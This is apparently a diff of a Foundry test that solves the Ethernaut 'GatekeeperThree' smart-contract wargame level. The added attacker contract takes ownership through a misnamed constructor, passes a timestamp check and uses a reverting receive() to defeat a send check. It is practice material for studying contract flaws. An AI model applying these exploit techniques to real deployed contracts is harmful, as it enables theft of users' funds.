@@ -17,5 +17,25 @@ contract GatekeeperThreeLevel is SetUpLevelTest {
         gatekeeperThree = GatekeeperThree(payable(instance));
 
         /** CODE YOUR SOLUTION HERE */
+        vm.startPrank(player, player);
+        GateAttackThree gateAttack = new GateAttackThree();
+        gateAttack.open{value: 0.01 ether}(address(gatekeeperThree));
+        vm.stopPrank();
+    }
+}
+
+contract GateAttackThree {
+    function open(address _target) public payable {
+        GatekeeperThree gateThree = GatekeeperThree(payable(_target));
+        gateThree.construct0r();
+        gateThree.createTrick();
+        gateThree.getAllowance(block.timestamp);
+        (bool success, ) = address(gateThree).call{value: msg.value}("");
+        assert(success);
+        gateThree.enter();
+    }
+
+    receive() external payable {
+        revert();
     }
 }
